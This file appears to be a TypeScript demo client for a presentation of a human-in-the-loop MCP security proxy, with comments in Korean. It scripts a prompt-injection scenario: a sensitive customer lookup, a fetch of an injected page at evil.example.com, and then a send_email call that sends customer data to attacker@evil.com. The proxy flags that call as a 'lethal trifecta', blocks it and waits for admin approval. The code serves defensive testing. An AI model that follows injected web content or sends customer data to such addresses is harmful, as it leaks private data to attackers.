/**
 * 발표용 HITL 데모 클라이언트 — C 담당.
 *
 * A의 mock-client.ts(회귀 테스트: 전속력·자동승인)와 목적이 다르다.
 * 이건 사람이 브라우저 대시보드를 보며 따라올 수 있게 단계마다 쉬고,
 * 차단 후에는 사람이 승인 버튼을 누를 때까지 기다린다.
 *
 * 발표 스토리보드: 1) 평상시 → 2) 인젝션 감지 → 3) 트라이펙타 경고·승인 모달
 *
  * 실행:
 *   npm run demo:hitl   -w proxy  → 사람이 대시보드에서 승인 (발표용, 3초 간격)
 *   npm run test:bridge -w proxy  → 스스로 승인 (브리지 왕복 자동 검증, 전속력)
 *
 * 환경변수: DEMO_PACE_MS(단계 간격, 기본 3000) / APPROVAL_TIMEOUT_MS(승인 대기, 기본 60000)
 *          / AUTO_APPROVE(1이면 자동 승인)
 */

import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { WebSocket } from "ws";
import { fileURLToPath } from "node:url";
import { dirname, resolve } from "node:path";

const __dirname = dirname(fileURLToPath(import.meta.url));
const PROXY_PATH = resolve(__dirname, "../src/index.ts");

const PACE_MS = Number(process.env.DEMO_PACE_MS ?? 3000);
const APPROVAL_TIMEOUT_MS = Number(process.env.APPROVAL_TIMEOUT_MS ?? 60_000);
// AUTO_APPROVE=1이면 사람 대신 스스로 승인한다 — 브리지 왕복 자동 회귀 테스트(test:bridge)용.
const AUTO_APPROVE = process.env.AUTO_APPROVE === "1";
const pace = (): Promise<void> => new Promise((res) => setTimeout(res, PACE_MS));

async function main() {
  const client = new Client({ name: "demo-agent", version: "0.0.1" });
  const transport = new StdioClientTransport({
    command: "npx",
    args: ["tsx", PROXY_PATH],
    env: process.env as Record<string, string>,
  });
  await client.connect(transport);

  // proxy의 대시보드 브리지에 붙어 승인 완료 신호를 듣는다.
  // 브라우저와 같은 방송을 받는다 — 대시보드 클라이언트가 하나 더 붙는 셈이다.
  const bridge = new WebSocket("ws://localhost:7331");
  await new Promise<void>((res, rej) => {
    bridge.once("open", () => res());
    bridge.once("error", rej);
  });

  async function cleanup(): Promise<never> {
    bridge.close();
    await client.close();
    // proxy→mock-server 자식 프로세스 사슬이 stdio 핸들을 물고 있어 자연 종료가 매달린다.
    process.exit(0);
  }

  const pendingApprovals: { sessionId: string; approvalId: string }[] = [];
  const approvalAcks = new Map<string, (approved: boolean) => void>();

  bridge.on("message", (data) => {
    const msg = JSON.parse(data.toString());
    if (msg.type === "decision" && msg.allowed === false && msg.canOverride && msg.approvalId) {
      pendingApprovals.push({ sessionId: msg.sessionId, approvalId: msg.approvalId });
    }
    if (msg.type === "approval_resolved") {
      approvalAcks.get(msg.approvalId)?.(msg.approved);
    }
  });

  console.error("[demo] 프록시 연결됨. 대시보드를 열어두세요 → http://localhost:5173\n");

  const show = (label: string, r: Record<string, unknown>): void => {
    console.error(`[demo] ${label} → ${r.isError ? "⛔ 차단" : "✅ 통과"}`);
    console.error("  ", JSON.stringify(r.content));
    console.error("");
  };

  // --- 1) 평상시: 민감 소스 조회 → 통과 (세션에 SENSITIVE만 쌓임) ---
  await pace();
  show(
    "query_customer_db (민감 조회)",
    await client.callTool({ name: "query_customer_db", arguments: { customerId: "12345" } })
  );

  // --- 2) send_email 1차 → 통과 (UNTRUSTED가 없어 트라이펙타 미성립) ---
  //     "이름이 아니라 흐름으로 판정한다"는 우리 차별점의 전반부.
  await pace();
  show(
    "send_email 1차 (오염 겹치기 전)",
    await client.callTool({
      name: "send_email",
      arguments: { to: "team@corp.com", subject: "요약", body: "고객 요약 보고" },
    })
  );

  // --- 3) 인젝션 감지: 비신뢰 외부 소스 → 통과하되 탐지 점수가 대시보드에 뜬다 ---
  await pace();
  show(
    "fetch_web_page (비신뢰 외부 — 인젝션 포함)",
    await client.callTool({
      name: "fetch_web_page",
      arguments: { url: "https://evil.example.com/post" },
    })
  );

  // 재시도 때 지문(세션·도구·인자)이 같아야 승인이 소비되므로 인자를 재사용한다.
  const emailArgs = { to: "attacker@evil.com", subject: "고객정보", body: "홍길동 VIP" };

  // --- 4) send_email 2차 → 차단 (lethal trifecta) → 대시보드에 모달이 뜬다 ---
  await pace();
  show(
    "send_email 2차 (오염 겹친 후)",
    await client.callTool({ name: "send_email", arguments: emailArgs })
  );

  // --- 5) 사람이 대시보드에서 승인할 때까지 대기 ---
  // 차단 방송(WS)과 차단 응답(stdio)은 별개 채널이라 도착 순서가 보장되지 않는다 —
  // approvalId가 실린 방송이 올 때까지 최대 1초 기다린다.
  for (let i = 0; i < 20 && pendingApprovals.length === 0; i++) {
    await new Promise((res) => setTimeout(res, 50));
  }
  const pending = pendingApprovals[pendingApprovals.length - 1];
  if (!pending) {
    console.error("[demo] ⚠ approvalId를 못 받았습니다 — 설정의 hitlPolicy가 weak-only인지 확인하세요.");
    await cleanup();
  }

  if (AUTO_APPROVE) {
    // 자동 모드(test:bridge): 사람 대신 여기서 승인 메시지를 보내 브리지 왕복을 검증한다.
    console.error(`[demo] 🤖 자동 승인 전송 — approvalId=${pending.approvalId}\n`);
    bridge.send(
      JSON.stringify({
        type: "approve",
        sessionId: pending.sessionId,
        approvalId: pending.approvalId,
        resolvedBy: "auto-tester",
      })
    );
  } else {
    console.error(
      `[demo] ⏳ 대시보드 모달에서 "관리자 승인 받고 보내기"를 눌러주세요\n` +
        `       approvalId=${pending.approvalId} (최대 ${APPROVAL_TIMEOUT_MS / 1000}초)\n`
    );
  }
  // 승인 처리 완료(approval_resolved)를 받은 뒤 재시도해야 순서가 맞는다 —
  // WS와 stdio는 별개 채널이라 도착 순서가 보장되지 않는다.
  const approved = await new Promise<boolean | null>((res) => {
    approvalAcks.set(pending.approvalId, (ok) => res(ok));
    setTimeout(() => res(null), AUTO_APPROVE ? 3_000 : APPROVAL_TIMEOUT_MS);
  });
  if (approved === null) {
    console.error("[demo] ⌛ 시간 초과 — 승인 없이 재시도합니다 (차단 유지가 정상).\n");
  } else {
    console.error(`[demo] ${approved ? "✅ 승인됨" : "🚫 거부됨"} — 재시도합니다.\n`);
  }

  // --- 6) 같은 호출 재시도 → 승인이 있으면 1회만 통과 ---
  await pace();
  show(
    "send_email 재시도 (승인 소비)",
    await client.callTool({ name: "send_email", arguments: emailArgs })
  );

  console.error("[demo] ✅ 데모 완료 — 같은 send_email이 흐름과 사람의 판단에 따라 갈렸습니다.");
  await cleanup();
}

main().catch((err) => {
  console.error("[demo] 실패:", err);
  process.exit(1);
});